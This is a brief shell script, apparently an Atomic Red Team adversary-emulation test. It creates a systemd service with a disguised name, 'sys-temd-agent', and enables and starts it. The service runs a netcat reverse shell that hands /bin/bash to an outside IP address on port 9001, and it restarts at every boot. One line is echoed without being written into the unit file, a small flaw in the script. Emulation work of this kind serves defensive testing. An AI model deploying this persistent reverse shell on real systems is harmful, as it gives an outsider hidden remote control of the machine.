echo "[Unit]" > /etc/systemd/system/sys-temd-agent.service
echo "Description=Atomic Red Team Systemd Service" >> /etc/systemd/system/sys-temd-agent.service
echo "" >> /etc/systemd/system/sys-temd-agent.service
echo "[Service]" >> /etc/systemd/system/sys-temd-agent.service
echo "Type=simple"
echo "ExecStart=nc -e /bin/bash 192.168.100.191 9001" >> /etc/systemd/system/sys-temd-agent.service
echo "ExecStop=echo haha youve been pwned" >> /etc/systemd/system/sys-temd-agent.service
echo "" >> /etc/systemd/system/sys-temd-agent.service
echo "[Install]" >> /etc/systemd/system/sys-temd-agent.service
echo "WantedBy=graphical.target" >> /etc/systemd/system/sys-temd-agent.service
systemctl daemon-reload
systemctl enable sys-temd-agent.service
systemctl start sys-temd-agent.service
